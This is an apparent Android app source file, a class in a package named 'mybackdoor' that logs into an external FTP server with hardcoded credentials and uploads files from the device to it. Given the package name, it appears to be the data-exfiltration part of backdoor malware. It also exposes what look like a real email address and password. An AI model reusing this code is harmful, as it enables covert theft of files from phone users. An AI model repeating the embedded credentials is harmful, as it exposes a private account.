package com.speedyapps.mybackdoor;
import android.Manifest;
import android.content.Context;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

public class FTPFunctions {
    private static final String FTP_HOST = "ftp.drivehq.com";
    private static final String FTP_USER = "viveksp.ac@gmail.com";
    private static final String FTP_PASS = "2014Vivek";
    FTPClient ftpClient = new FTPClient();
    Context con;
    boolean stat;
    InputStream inputStream;
    String outName;
    String fileVar="";

    FTPFunctions(Context c) {
        con = c;
    }
    public boolean login()  {
        stat = false;
        ftpClient.setConnectTimeout(50 * 1000);
        try {
            ftpClient.connect(FTP_HOST, 21);
        }catch(Exception e){
            Log.i("zz","Error : -"+e.toString());}
        int ftpreply = ftpClient.getReplyCode();
        if(!FTPReply.isPositiveCompletion(ftpreply)){
            Log.i("zz", "Connect: Status: "+FTPReply.isPositiveCompletion(ftpreply));
            try{
                ftpClient.disconnect();
            }catch(Exception e){Log.i("zz",e.toString());}
        }
        try{
            stat = ftpClient.login(FTP_USER, FTP_PASS);
        }catch(Exception e){Log.i("zz",e.toString());}
        if (stat == true){
            Log.i("zz", "SUCCESS"+stat);
            return stat;}
        return stat;
    }
    public void uploadFile(String fileName) throws IOException {
        String[] parts = fileName.split("/");
        outName=parts[2];
        Log.i("zz","OUT"+outName);
        ftpClient.enterLocalPassiveMode();
        ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
        inputStream = new FileInputStream(fileName);
        OutputStream outputStream = ftpClient.storeFileStream(outName);
        byte[] bytesIn = new byte[4096];
        int read = 0;
        while ((read = inputStream.read(bytesIn)) != -1) {
            outputStream.write(bytesIn, 0, read);
        }
        inputStream.close();
        outputStream.close();
        boolean completed = ftpClient.completePendingCommand();
        if (completed) {
            Log.i("zz","Completed!!");
            ftpClient.disconnect();
        }

    }



}






